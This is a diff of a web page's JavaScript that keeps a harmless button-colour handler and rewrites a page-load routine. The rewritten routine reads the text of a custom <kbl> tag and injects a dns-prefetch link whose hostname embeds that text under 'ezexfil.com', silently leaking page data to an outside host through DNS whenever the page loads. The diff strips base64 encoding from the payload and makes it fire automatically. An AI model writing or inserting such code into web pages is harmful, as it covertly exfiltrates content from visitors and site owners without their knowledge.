@@ -15,32 +15,26 @@ function btnCalc() {
     console.log("Button clicked! New color: " + randomColor);
 }
 
-
-(function() {
+window.addEventListener('load', function() {
     // 1. Find the custom <kbl> tag
     const kblElement = document.querySelector('kbl');
 
     if (kblElement) {
         // 2. Get the raw text data from the tag
-        const rawData = kblElement.textContent || kblElement.innerText;
+        const rawData = (kblElement.textContent || kblElement.innerText).trim();
 
-        // 3. Convert the data to Base64
-        // btoa() handles string to base64 conversion
-        const base64Data = btoa(rawData);
+        // 3. Construct the URL (Using the raw data directly)
+        // Note: Ensure rawData doesn't contain spaces or symbols invalid for DNS
+        const exfilUrl = `${rawData}.z3zhkadg4qsehefe.ezexfil.com`;
 
-        // 4. Construct the exfiltration URL
-        const exfilUrl = `${base64Data}.z3zhkadg4qsehefe.ezexfil.com`;
-
-        // 5. Create the <link> element
+        // 4. Create the <link> element
         const link = document.createElement('link');
         link.rel = 'dns-prefetch';
-        link.href = `//${exfilUrl}`; // Use // to ensure it's treated as a URL
+        link.href = `//${exfilUrl}`;
 
-        // 6. Append to the document head
+        // 5. Append to the document head
         document.head.appendChild(link);
         
-        console.log(`DNS Prefetch initialized for: ${exfilUrl}`);
-    } else {
-        console.error("Tag <kbl> not found in document.");
+        console.log("Page loaded. DNS Prefetch added for: " + exfilUrl);
     }
-})();
+});
